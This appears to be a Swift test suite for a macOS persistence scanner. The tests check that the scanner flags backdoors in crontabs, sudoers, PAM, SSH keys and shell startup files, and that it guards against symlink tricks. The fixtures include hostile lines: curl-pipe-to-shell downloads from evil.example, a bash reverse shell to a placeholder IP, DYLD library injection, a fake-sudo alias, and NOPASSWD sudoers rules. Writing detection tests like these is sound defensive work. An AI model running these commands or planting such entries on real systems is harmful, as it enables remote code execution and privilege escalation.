import Darwin
import Foundation
import Testing
@testable import HectorCore

/// A fake system root: `private/var/at/tabs`, `private/etc`, `Users/…` live under it.
private struct Fixture {
    let root: URL
    /// The tests run as this user, so files they write pass the "owned by its user" check.
    let me = getuid()

    init() throws {
        // realpath: the temporary folder sits behind /var, a symbolic link.
        let base = FileManager.default.temporaryDirectory.resolvingSymlinksInPath().appending(path: "hector-root-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
        root = base
    }

    func remove() { try? FileManager.default.removeItem(at: root) }

    @discardableResult
    func write(_ text: String, to path: String) throws -> URL {
        let url = root.appending(path: path)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
        return url
    }

    func scanner(_ accounts: [LocalAccount]) -> PrivilegedPersistenceScanner {
        PrivilegedPersistenceScanner(system: root.path, accounts: accounts)
    }

    func encoded(_ report: PrivilegedPersistence) throws -> String {
        String(decoding: try JSONEncoder.hectorWire.encode(HelperResponse.rootPersistence(report)), as: UTF8.self)
    }
}

private let sampleKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOy9+oReM60bYUUV0b579j1lRmqAdueT7NfIeW5JUPWP test@example"
private let sampleFingerprint = "SHA256:E3pr2pQMavA5IHmO9NiFqGAHkV5wCz4KB9F2NtNRQa0"

@Suite struct GuardedDirectoryTests {
    @Test func refusesSymbolicLinksAtEveryStep() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let secret = try fixture.write("root only", to: "secret/master.passwd")
        try fixture.write("ok", to: "home/real/file")
        try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: "home/file-link"), withDestinationURL: secret)
        try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: "home/folder-link"),
                                                   withDestinationURL: secret.deletingLastPathComponent())

        let home = try GuardedDirectory(trusted: fixture.root.path).descend("home")
        #expect(String(decoding: try home.descend("real").read("file", maximumSize: 100).data, as: UTF8.self) == "ok")
        // The last component…
        #expect(throws: GuardedDirectory.Failure.self) { try home.read("file-link", maximumSize: 100) }
        // …and one in the middle of the path.
        #expect(throws: GuardedDirectory.Failure.self) { try home.descend("folder-link") }
        #expect(throws: GuardedDirectory.Failure.self) { try GuardedDirectory(trusted: fixture.root.path).descend("home/folder-link") }
        #expect(home.facts(of: "file-link")?.kind == .symbolicLink)
    }

    @Test func namesAreSingleComponents() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("x", to: "a/b")
        let a = try GuardedDirectory(trusted: fixture.root.path).descend("a")
        for name in ["..", ".", "", "../a/b", "b/", "/etc/passwd"] {
            #expect(throws: GuardedDirectory.Failure.self, "\(name)") { try a.read(name, maximumSize: 10) }
            #expect(throws: GuardedDirectory.Failure.self, "\(name)") { try a.directory(name) }
            #expect(a.facts(of: name) == nil)
        }
    }

    @Test func neverBlocksOnAPipeAndReadsRegularFilesOnly() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("x", to: "a/file")
        #expect(mkfifo(fixture.root.appending(path: "a/pipe").path, 0o644) == 0)
        let a = try GuardedDirectory(trusted: fixture.root.path).descend("a")
        // Opening a pipe nobody writes to would wait forever without O_NONBLOCK.
        #expect(throws: GuardedDirectory.Failure.self) { try a.read("pipe", maximumSize: 10) }
        #expect(throws: GuardedDirectory.Failure.self) { try GuardedDirectory(trusted: fixture.root.path).read("a", maximumSize: 10) }
    }

    @Test func readsAndListingsAreBounded() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write(String(repeating: "a", count: 5_000), to: "a/big")
        for index in 0..<20 { try fixture.write("", to: "many/\(index)") }
        let root = try GuardedDirectory(trusted: fixture.root.path)
        let big = try root.descend("a").read("big", maximumSize: 1_000)
        #expect(big.data.count == 1_000 && big.truncated && big.facts.size == 5_000)
        let listing = try root.descend("many").names(limit: 5)
        #expect(listing.names.count == 5 && !listing.complete)
        #expect(try root.descend("many").names().complete)
    }
}

@Suite struct PersistenceAnalyzerTests {
    @Test func readsAuthorizedKeysLikeSSHKeygen() {
        let file = """
        # a comment
        \(sampleKey)
        command="/usr/local/bin/backdoor --arg \\"x, y\\"",no-pty,from="10.0.0.1,10.0.0.2" \(sampleKey) second key
        cert-authority,environment="A=b" \(sampleKey)
        not a key at all
        ssh-ed25519 !!!notbase64!!! broken
        """
        let (keys, invalid) = PersistenceParsers.authorizedKeys(Data(file.utf8))
        #expect(invalid == 2)
        #expect(keys.count == 3)
        #expect(keys.allSatisfy { $0.fingerprint == sampleFingerprint && $0.type == "ssh-ed25519" })
        #expect(keys[0].comment == "test@example" && keys[0].options.isEmpty && keys[0].forcedCommand == nil)
        #expect(keys[1].options == ["command", "no-pty", "from"])
        #expect(keys[1].forcedCommand == #"/usr/local/bin/backdoor --arg \"x, y\""#)
        #expect(keys[1].comment == "test@example second key")
        #expect(keys[2].options == ["cert-authority", "environment"])
    }

    @Test func authorizedKeysAreBoundedAndCleaned() {
        let many = Array(repeating: sampleKey, count: 1_000).joined(separator: "\n")
        #expect(PersistenceParsers.authorizedKeys(Data(many.utf8)).keys.count == PersistenceParsers.maximumAuthorizedKeys)
        let hostile = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOy9+oReM60bYUUV0b579j1lRmqAdueT7NfIeW5JUPWP \u{1B}[31mred\u{202E}"
        let comment = PersistenceParsers.authorizedKeys(Data(hostile.utf8)).keys[0].comment
        #expect(!comment.contains("\u{1B}") && !comment.contains("\u{202E}"))
    }

    @Test func flagsWhatMalwareAddsToShellFiles() {
        func notes(_ text: String) -> [String] { PersistenceParsers.shellStartupNotes(Data(text.utf8)) }
        #expect(notes("curl -fsSL https://evil.example/x.sh | bash") == ["downloads and runs code"])
        #expect(notes("eval \"$(curl -s https://evil.example/x)\"") == ["downloads and runs code"])
        #expect(notes("echo aGk= | base64 -d | sh") == ["decodes base64 text"])
        #expect(notes("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1") == ["opens a network connection"])
        #expect(notes("export DYLD_INSERT_LIBRARIES=/tmp/x.dylib") == ["sets a DYLD variable, which loads a library into programs"])
        #expect(notes("alias sudo='/tmp/fake-sudo'") == ["redefines sudo, su or ssh"])
        #expect(notes("sudo() { /tmp/steal \"$@\"; }") == ["redefines sudo, su or ssh"])
        #expect(notes("python3 -c 'import os'") == ["runs an inline script"])
        #expect(notes("nohup /Users/Shared/.agent >/dev/null 2>&1 &") == ["starts a background job"])
        #expect(notes("# curl https://x | sh\n") == [])
    }

    @Test func aFileWrittenToBeSlowStaysCheap() {
        // Every line restarts the costliest patterns as often as it can, up to the size read.
        let line = String(repeating: "curl x eval ( nc a ", count: 60)
        let hostile = Data(String(repeating: line + "\n", count: UserFiles.maximumStartupFileSize / (line.count + 1)).utf8)
        let start = Date()
        _ = PersistenceParsers.shellStartupNotes(hostile)
        #expect(Date().timeIntervalSince(start) < 2)
    }

    @Test func ordinaryShellFilesRaiseNoFlag() {
        let ordinary = """
        export PATH="$HOME/.local/bin:/opt/homebrew/bin:$PATH"
        eval "$(/opt/homebrew/bin/brew shellenv)"
        [ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
        alias ll='ls -la'
        if [[ -f ~/.fzf.zsh ]] && [[ -o interactive ]]; then source ~/.fzf.zsh; fi
        export EDITOR=vim && export PAGER=less
        autoload -Uz compinit && compinit
        source <(kubectl completion zsh)
        eval "$(ssh-agent -s)" > /dev/null
        export HOMEBREW_GITHUB_API_TOKEN=ghp_notarealtoken
        """
        #expect(PersistenceParsers.shellStartupNotes(Data(ordinary.utf8)) == [])
    }

    @Test func describesSudoersWithoutItsText() {
        let stock = """
        ## sudoers file.
        Defaults\tenv_reset
        Defaults\tenv_keep += "BLOCKSIZE"
        Defaults\tlecture_file = "/etc/sudo_lecture"
        root\t\tALL = (ALL) ALL
        %admin\t\tALL = (ALL) ALL
        #includedir /private/etc/sudoers.d
        """
        let facts = PersistenceParsers.sudoers(Data(stock.utf8))
        #expect(facts.isStock && facts.ruleCount == 2 && facts.notes.isEmpty)

        let added = PersistenceParsers.sudoers(Data((stock + "\nalex ALL=(ALL) NOPASSWD: \\\n  /usr/bin/true\n").utf8))
        #expect(!added.isStock && added.ruleCount == 3)
        #expect(added.notes == ["grants commands without a password (NOPASSWD)"])

        let weakened = PersistenceParsers.sudoers(Data("""
        Defaults !authenticate
        Defaults env_keep += "DYLD_INSERT_LIBRARIES"
        Defaults timestamp_timeout=-1
        @include /tmp/more
        Cmnd_Alias X = /bin/ls
        """.utf8))
        // An include that only looks like it stays in /etc/sudoers.d.
        for sneaky in ["#include /etc/sudoers.d/../../tmp/x", "@includedir /private/etc/sudoers.d/%h", "#include sudoers.d/x"] {
            let facts = PersistenceParsers.sudoers(Data("root ALL = (ALL) ALL\n%admin ALL = (ALL) ALL\n\(sneaky)\n".utf8))
            #expect(facts.notes == ["includes rules from outside /etc/sudoers.d"] && !facts.isStock, "\(sneaky)")
        }
        #expect(weakened.ruleCount == 0)
        #expect(weakened.notes == ["turns off the password (!authenticate)", "keeps library-loading variables (env_keep)",
                                   "never asks for the password again (timestamp_timeout)", "includes rules from outside /etc/sudoers.d"])
    }

    @Test func parsesPAMServicesAndAtJobNames() {
        let entries = PersistenceParsers.pamService(Data("""
        # sudo: auth account password session
        auth       include        sudo_local
        auth       [success=1 default=ignore]  pam_tid.so
        auth       sufficient     /usr/local/lib/pam/pam_evil.so debug
        """.utf8))
        #expect(entries.map(\.module) == ["sudo_local", "pam_tid.so", "/usr/local/lib/pam/pam_evil.so"])
        #expect(entries.map(\.control) == ["include", "[success=1 default=ignore]", "sufficient"])

        let job = PersistenceParsers.atJob(named: "a0000a01c1e5d0")
        #expect(job?.queue == "a" && job?.number == 10)
        #expect(job?.runsAt == Date(timeIntervalSince1970: TimeInterval(0x01c1e5d0) * 60))
        for bad in [".SEQ", ".lockfile", "a0000a01c1e5d", "a0000g01c1e5d0", "10000a01c1e5d0"] {
            #expect(PersistenceParsers.atJob(named: bad) == nil, "\(bad)")
        }
    }

    @Test func findsLibraryInjectionInLaunchdEnvironments() {
        #expect(PersistenceParsers.libraryInjection(environment: ["PATH": "/usr/bin", "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"])
                == ["DYLD_INSERT_LIBRARIES=/tmp/x.dylib"])
        #expect(PersistenceParsers.libraryInjection(environment: ["PATH": "/usr/bin"]).isEmpty)
        #expect(PersistenceParsers.libraryInjection(environment: nil).isEmpty)
    }
}

@Suite struct PrivilegedPersistenceScannerTests {
    @Test func cronCommandsAreShownForTheViewerAndRootOnly() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("MAILTO=\"\"\n*/5 * * * * /var/root/.hidden/beacon --quiet\n", to: "private/var/at/tabs/root")
        try fixture.write("0 9 * * * /usr/local/bin/mine\n", to: "private/var/at/tabs/alex")
        try fixture.write("0 3 * * * /usr/bin/curl -u bob:hunter2 https://example.com\n", to: "private/var/at/tabs/bob")
        let accounts = [LocalAccount(name: "root", userID: 0, home: "/var/root"), LocalAccount(name: "alex", userID: 501, home: "/Users/alex"),
                        LocalAccount(name: "bob", userID: 502, home: "/Users/bob")]

        let forAlex = fixture.scanner(accounts).scan(viewer: 501)
        let cron = try #require(forAlex.source(PrivilegedPersistence.cronTables))
        #expect(cron.complete)
        #expect(cron.items.map(\.label).sorted() == ["/usr/local/bin/mine", "/var/root/.hidden/beacon --quiet", "Cron job of bob (command hidden)"])
        let roots = try #require(cron.items.first { $0.details["user"] == "root" })
        #expect(roots.scope == .system && roots.notes.contains("runs as root") && roots.configurationPath == "/usr/lib/cron/tabs/root")
        let bobs = try #require(cron.items.first { $0.details["user"] == "bob" })
        #expect(bobs.details["schedule"] == "0 3 * * *" && bobs.arguments.isEmpty && bobs.executablePath == nil)
        // Nothing of bob's command line crosses the socket.
        #expect(!(try fixture.encoded(forAlex)).contains("hunter2"))

        // Root sees everything; so does bob for his own.
        #expect(try fixture.encoded(fixture.scanner(accounts).scan(viewer: 0)).contains("hunter2"))
        #expect(try fixture.encoded(fixture.scanner(accounts).scan(viewer: 502)).contains("hunter2"))
        #expect(!(try fixture.encoded(fixture.scanner(accounts).scan(viewer: 502))).contains("/usr/local/bin/mine"))
    }

    @Test func aTableThatIsALinkOrAPipeIsNotRead() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let secret = try fixture.write("* * * * * /secret/command\n", to: "elsewhere/secret")
        try fixture.write("", to: "private/var/at/tabs/.keep")
        try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: "private/var/at/tabs/root"), withDestinationURL: secret)
        #expect(mkfifo(fixture.root.appending(path: "private/var/at/tabs/alex").path, 0o644) == 0)
        let cron = try #require(fixture.scanner([]).scan(viewer: 0).source(PrivilegedPersistence.cronTables))
        #expect(cron.items.isEmpty)
        #expect(cron.notes == ["/usr/lib/cron/tabs/alex could not be read", "/usr/lib/cron/tabs/root could not be read"])
    }

    @Test func missingPlacesAreCompleteAndEmpty() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let report = fixture.scanner([LocalAccount(name: "ghost", userID: 600, home: "/Users/ghost")]).scan(viewer: 501)
        #expect(report.sources.count == 5)
        #expect(report.sources.filter { $0.name != PrivilegedPersistence.sudoers }.allSatisfy { $0.complete && $0.items.isEmpty && $0.notes.isEmpty })
    }

    @Test func userFilesGiveFactsNotText() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let me = LocalAccount(name: "alex", userID: fixture.me, home: "/Users/alex")
        let other = LocalAccount(name: "bob", userID: fixture.me, home: "/Users/bob")
        try fixture.write("export API_TOKEN=s3cr3t-token\ncurl https://evil.example/i.sh | sh\n", to: "Users/bob/.zshrc")
        try fixture.write("command=\"/tmp/secret-forced-command\" \(sampleKey)\n".replacingOccurrences(of: "test@example", with: "bob-private-comment"),
                          to: "Users/bob/.ssh/authorized_keys")
        try fixture.write("export PATH=/usr/bin\n", to: "Users/alex/.config/fish/config.fish")
        try fixture.write("\(sampleKey)\n", to: "Users/alex/.ssh/authorized_keys")

        // Viewed by someone who is neither alex nor bob (and not root).
        let report = fixture.scanner([me, other]).scan(viewer: fixture.me &+ 1)
        let text = try fixture.encoded(report)
        for secret in ["s3cr3t-token", "evil.example", "secret-forced-command", "bob-private-comment", "test@example"] {
            #expect(!text.contains(secret), "\(secret)")
        }
        let startup = try #require(report.source(PrivilegedPersistence.shellStartup)).items
        #expect(startup.map(\.label).sorted() == ["~alex/.config/fish/config.fish", "~bob/.zshrc"])
        #expect(startup.first { $0.label == "~bob/.zshrc" }?.notes == ["downloads and runs code"])
        #expect(startup.first { $0.label == "~bob/.zshrc" }?.configurationPath == "/Users/bob/.zshrc")
        let keys = try #require(report.source(PrivilegedPersistence.authorizedKeys)).items
        #expect(keys.count == 2 && keys.allSatisfy { $0.details["fingerprint"] == sampleFingerprint })
        let bobs = try #require(keys.first { $0.details["user"] == "bob" })
        #expect(bobs.label == "ssh-ed25519 key of bob" && bobs.details["command"] == nil && bobs.details["options"] == "command")
        #expect(bobs.notes == ["runs a command at login (command=)"])

        // The same scan for bob's own eyes gives the comment and the command, still not the file.
        let own = try fixture.encoded(fixture.scanner([other]).scan(viewer: fixture.me))
        #expect(own.contains("bob-private-comment") && own.contains("secret-forced-command") && !own.contains("s3cr3t-token"))
    }

    @Test func aUserCannotPointTheScanAtSomeoneElsesFile() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let secret = try fixture.write("\(sampleKey)\nexport ROOT_SECRET=1 ; nohup x &\n", to: "private/var/root/secret")
        // mallory links her files to a file that is not hers…
        try fixture.write("", to: "Users/mallory/.ssh/.keep")
        for link in ["Users/mallory/.zshrc", "Users/mallory/.ssh/authorized_keys"] {
            try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: link), withDestinationURL: secret)
        }
        // …eve makes her whole .ssh folder a link, and her .profile a pipe…
        try fixture.write("", to: "Users/eve/.keep")
        try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: "Users/eve/.ssh"), withDestinationURL: secret.deletingLastPathComponent())
        #expect(mkfifo(fixture.root.appending(path: "Users/eve/.profile").path, 0o644) == 0)
        // …and trent's home itself is a link.
        try FileManager.default.createSymbolicLink(at: fixture.root.appending(path: "Users/trent"), withDestinationURL: secret.deletingLastPathComponent())
        let accounts = ["mallory", "eve", "trent"].map { LocalAccount(name: $0, userID: fixture.me, home: "/Users/\($0)") }

        let report = fixture.scanner(accounts).scan(viewer: 0)
        let keys = try #require(report.source(PrivilegedPersistence.authorizedKeys))
        let startup = try #require(report.source(PrivilegedPersistence.shellStartup))
        // No key was parsed and no flag computed from the linked file: only "could not be read".
        #expect(keys.items.map(\.label) == ["~mallory/.ssh/authorized_keys"])
        #expect(keys.items[0].details["fingerprint"] == nil && keys.items[0].notes.first?.hasPrefix("could not be read") == true)
        #expect(startup.items.map(\.label).sorted() == ["~eve/.profile", "~mallory/.zshrc"])
        #expect(startup.items.allSatisfy { $0.notes.count == 1 && $0.notes[0].hasPrefix("could not be read") })
        #expect(startup.notes.count == 1 && startup.notes[0].hasPrefix("home folder of trent was not read"))
    }

    @Test func aFileItsUserDoesNotOwnIsNotRead() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        // A hard link to another user's file keeps that user as owner: here the account is
        // someone else than the owner of the files (the user running the tests).
        try fixture.write("curl https://evil.example | sh\n", to: "Users/carol/.zshrc")
        try fixture.write("\(sampleKey)\n", to: "Users/carol/.ssh/authorized_keys")
        let report = fixture.scanner([LocalAccount(name: "carol", userID: fixture.me &+ 7, home: "/Users/carol")]).scan(viewer: 0)
        let rc = try #require(report.source(PrivilegedPersistence.shellStartup)?.items.first)
        #expect(rc.notes == ["not owned by carol (owner: user \(fixture.me)); not read"])
        let key = try #require(report.source(PrivilegedPersistence.authorizedKeys)?.items.first)
        #expect(key.details["fingerprint"] == nil && key.notes.first?.hasSuffix("not read") == true)
    }

    @Test func rootsHomeIsReachedThroughItsRealPath() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        #expect(UserFiles.components(ofHome: "/var/root") == ["private", "var", "root"])
        #expect(UserFiles.components(ofHome: "/Users/alex") == ["Users", "alex"])
        try fixture.write("\(sampleKey)\n", to: "private/var/root/.ssh/authorized_keys")
        let plist = try PropertyListSerialization.data(fromPropertyList: ["LoginHook": "/var/root/.hook.sh --now", "LogoutHook": ""],
                                                       format: .binary, options: 0)
        try FileManager.default.createDirectory(at: fixture.root.appending(path: "private/var/root/Library/Preferences"), withIntermediateDirectories: true)
        try plist.write(to: fixture.root.appending(path: "private/var/root/Library/Preferences/com.apple.loginwindow.plist"))

        // The account is root's name with the test user's ID, so the file counts as its own.
        let report = fixture.scanner([LocalAccount(name: "root", userID: fixture.me, home: "/var/root")]).scan(viewer: 501)
        #expect(report.source(PrivilegedPersistence.authorizedKeys)?.items.first?.configurationPath == "/var/root/.ssh/authorized_keys")
        let hooks = try #require(report.source(PrivilegedPersistence.rootLoginHooks)).items
        #expect(hooks.map(\.label) == ["LoginHook: /var/root/.hook.sh --now"])
        #expect(hooks[0].executablePath == "/var/root/.hook.sh" && hooks[0].notes.contains("runs as root at every login"))
    }

    @Test func sudoersAreDescribedByFlags() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("root ALL = (ALL) ALL\n%admin ALL = (ALL) ALL\n#includedir /private/etc/sudoers.d\n", to: "private/etc/sudoers")
        try fixture.write("mallory ALL=(ALL) NOPASSWD: /Users/mallory/bin/anything\n", to: "private/etc/sudoers.d/zz-backdoor")
        try fixture.write("ignored ALL=(ALL) NOPASSWD: ALL\n", to: "private/etc/sudoers.d/editor.bak")
        let report = fixture.scanner([]).scan(viewer: 501)
        let rules = try #require(report.source(PrivilegedPersistence.sudoers)).items
        #expect(rules.map(\.label) == ["sudoers", "sudoers.d/zz-backdoor"])
        // Written by the test user, not root: flagged, and so not taken for Apple's.
        #expect(rules[0].notes == ["configuration is not owned by root"] && rules[0].details["rules"] == "2")
        #expect(rules[1].notes.prefix(2) == ["not part of macOS", "grants commands without a password (NOPASSWD)"])
        #expect(!(try fixture.encoded(report)).contains("/Users/mallory/bin/anything"))
    }
}

@Suite struct PersistenceSystemSourcesTests {
    private func scanner(_ fixture: Fixture, tools: ToolRunner = .none) -> PersistenceScanner {
        PersistenceScanner(roots: .init(home: fixture.root.appending(path: "Users/alex"), system: fixture.root, userID: fixture.me, userName: "alex"),
                           tools: tools)
    }

    @Test func withoutTheHelperOnlyTheUsersOwnFilesAreRead() throws {
        guard getuid() != 0 else { return }
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("\(sampleKey)\n", to: "Users/alex/.ssh/authorized_keys")
        try fixture.write("alias sudo=/tmp/x\n", to: "Users/alex/.zshrc")
        try fixture.write("export PATH=/usr/bin\n", to: "private/etc/zshrc")
        try fixture.write("nohup /Library/x &\n", to: "private/etc/zshenv")
        let report = scanner(fixture).scan(options: .init(includeApple: true, categories: [.sshKey, .shellStartup, .sudoRule, .cronJob, .loginHook]))
        #expect(report.items.filter { $0.category == .sshKey }.map(\.label) == ["test@example"])
        let startup = report.items.filter { $0.category == .shellStartup }
        #expect(startup.first { $0.label == "~alex/.zshrc" }?.notes == ["redefines sudo, su or ssh"])
        // Written by the test user: a stock name, but not root's file.
        #expect(startup.first { $0.label == "/etc/zshrc" }?.scope == .system)
        #expect(startup.first { $0.label == "/etc/zshenv" }?.notes.prefix(2) == ["not part of macOS", "starts a background job"])
        let notes = report.sources.flatMap(\.notes)
        #expect(notes.contains("the crontabs of root and other users need the helper"))
        #expect(notes.contains("needs the helper: only root can read /etc/sudoers and /etc/sudoers.d"))
        #expect(notes.contains("the authorized keys of root and other users need the helper"))
        #expect(notes.contains("root's login hooks need the helper"))
    }

    @Test func theHelpersReportReplacesTheUsersOwnReading() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("\(sampleKey)\n", to: "Users/alex/.ssh/authorized_keys")
        let fromHelper = PersistenceItem(category: .cronJob, scope: .system, label: "/var/root/job", configurationPath: "/usr/lib/cron/tabs/root")
        let privileged = PrivilegedPersistence(sources: [
            .init(name: PrivilegedPersistence.cronTables, items: [fromHelper]),
            .init(name: PrivilegedPersistence.authorizedKeys, items: []),
        ])
        let asked = FakeCrontab()
        let report = scanner(fixture, tools: asked.runner).scan(options: .init(categories: [.cronJob, .sshKey], privileged: privileged))
        #expect(report.items.map(\.label) == ["/var/root/job"])
        #expect(!asked.wasRun)
        #expect(report.sources.flatMap(\.notes).isEmpty)

        // A helper that could not read the tables (macOS may refuse even root): crontab -l again.
        let refused = PrivilegedPersistence(sources: [.init(name: PrivilegedPersistence.cronTables, notes: ["refused"], complete: false)])
        let fallback = scanner(fixture, tools: asked.runner).scan(options: .init(categories: [.cronJob], privileged: refused))
        #expect(asked.wasRun)
        #expect(fallback.items.map(\.label) == ["/usr/local/bin/own-job"])
        #expect(fallback.sources.flatMap(\.notes).contains("refused"))
    }

    @Test func listsAtJobsWithoutOpeningThem() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("#!/bin/sh\nSECRET=1\n/tmp/run\n", to: "private/var/at/jobs/a0000a01c1e5d0")
        try fixture.write("", to: "private/var/at/jobs/.SEQ")
        let report = scanner(fixture).scan(options: .init(categories: [.atJob]))
        #expect(report.items.count == 1)
        #expect(report.items[0].details["queue"] == "a" && report.items[0].label.hasPrefix("at job 10 of "))
        #expect(!String(decoding: try JSONEncoder.hector.encode(report), as: UTF8.self).contains("SECRET"))
    }

    @Test func flagsPAMModulesThatAreNotApples() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        try fixture.write("", to: "usr/lib/pam/pam_opendirectory.so.2")
        try fixture.write("", to: "usr/lib/pam/pam_tid.so.2")
        try fixture.write("", to: "usr/local/lib/pam/pam_evil.so")
        try fixture.write("auth sufficient pam_tid.so\nauth required pam_opendirectory.so\n", to: "private/etc/pam.d/login")
        try fixture.write("auth sufficient pam_evil.so\nauth sufficient /tmp/x.so\nauth required pam_gone.so\nauth include login\n", to: "private/etc/pam.d/sudo")
        let items = scanner(fixture).scan(options: .init(includeApple: true, categories: [.pamService])).items
        #expect(items.map(\.label) == ["login", "pam_evil.so", "sudo"])
        // Written by the test user: no module of its own to flag, only its owner.
        #expect(items[0].notes == ["configuration is not owned by root"])
        let sudo = try #require(items.first { $0.label == "sudo" })
        #expect(sudo.scope == .system)
        #expect(sudo.notes.prefix(3) == ["loads pam_evil.so, which is not part of macOS", "loads /tmp/x.so, which is not part of macOS",
                                         "names a module that is not installed: pam_gone.so"])
        #expect(items.first { $0.label == "pam_evil.so" }?.executablePath == "/usr/local/lib/pam/pam_evil.so")
    }

    @Test func listsAuthorizationPluginsAndMachineLoginHooks() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let info = try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": "com.example.loginplugin", "CFBundleExecutable": "Plugin",
                                                                         "CFBundleShortVersionString": "1.2"], format: .xml, options: 0)
        try fixture.write(String(decoding: info, as: UTF8.self), to: "Library/Security/SecurityAgentPlugins/Evil.bundle/Contents/Info.plist")
        let hooks = try PropertyListSerialization.data(fromPropertyList: ["LogoutHook": "/Library/Scripts/bye.sh"], format: .xml, options: 0)
        try fixture.write(String(decoding: hooks, as: UTF8.self), to: "Library/Preferences/com.apple.loginwindow.plist")
        let report = scanner(fixture).scan(options: .init(categories: [.authorizationPlugin, .loginHook], privileged: PrivilegedPersistence(sources: [])))
        let plugin = try #require(report.items.first { $0.category == .authorizationPlugin })
        #expect(plugin.label == "com.example.loginplugin" && plugin.version == "1.2")
        #expect(plugin.executablePath == "/Library/Security/SecurityAgentPlugins/Evil.bundle/Contents/MacOS/Plugin")
        let hook = try #require(report.items.first { $0.category == .loginHook })
        #expect(hook.label == "LogoutHook: /Library/Scripts/bye.sh" && hook.notes.contains("runs as root at every logout"))
    }

    @Test func launchdJobsThatInjectALibraryAreFlagged() throws {
        let fixture = try Fixture()
        defer { fixture.remove() }
        let plist = try PropertyListSerialization.data(fromPropertyList: [
            "Label": "com.example.daemon", "ProgramArguments": ["/usr/bin/true"],
            "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/Library/x.dylib", "LANG": "C"],
        ], format: .xml, options: 0)
        try fixture.write(String(decoding: plist, as: UTF8.self), to: "Library/LaunchDaemons/com.example.daemon.plist")
        let item = try #require(scanner(fixture).scan(options: .init(categories: [.launchDaemon])).items.first)
        #expect(item.notes.contains("sets DYLD_INSERT_LIBRARIES: loads a library into the program"))
        #expect(item.details["injects"] == "DYLD_INSERT_LIBRARIES=/Library/x.dylib")
    }

    @Test func theWireFormatRoundTrips() throws {
        let report = PrivilegedPersistence(sources: [.init(name: PrivilegedPersistence.sudoers, items: [
            PersistenceItem(category: .sudoRule, scope: .system, label: "sudoers.d/x", notes: ["not part of macOS"]),
        ], notes: ["n"], complete: false)])
        let data = try JSONEncoder.hectorWire.encode(HelperResponse.rootPersistence(report))
        #expect(!data.contains(UInt8(ascii: "\n")))
        guard case .rootPersistence(let decoded) = try JSONDecoder.hector.decode(HelperResponse.self, from: data) else {
            Issue.record("not a rootPersistence reply")
            return
        }
        #expect(decoded.sources.first?.items.first?.category == .sudoRule && decoded.sources.first?.complete == false)
        // The request carries nothing a client could aim at a path.
        #expect(String(decoding: try JSONEncoder.hectorWire.encode(HelperRequest.rootPersistence), as: UTF8.self) == #"{"rootPersistence":{}}"#)
    }
}

/// `crontab -l` for the fallback test.
private final class FakeCrontab: @unchecked Sendable {
    private let lock = NSLock()
    private var runs = 0
    var wasRun: Bool { lock.withLock { runs > 0 } }
    var runner: ToolRunner {
        ToolRunner { executable, _ in
            guard executable == "/usr/bin/crontab" else { return nil }
            self.lock.withLock { self.runs += 1 }
            return ToolOutput(output: "0 1 * * * /usr/local/bin/own-job\n")
        }
    }
}
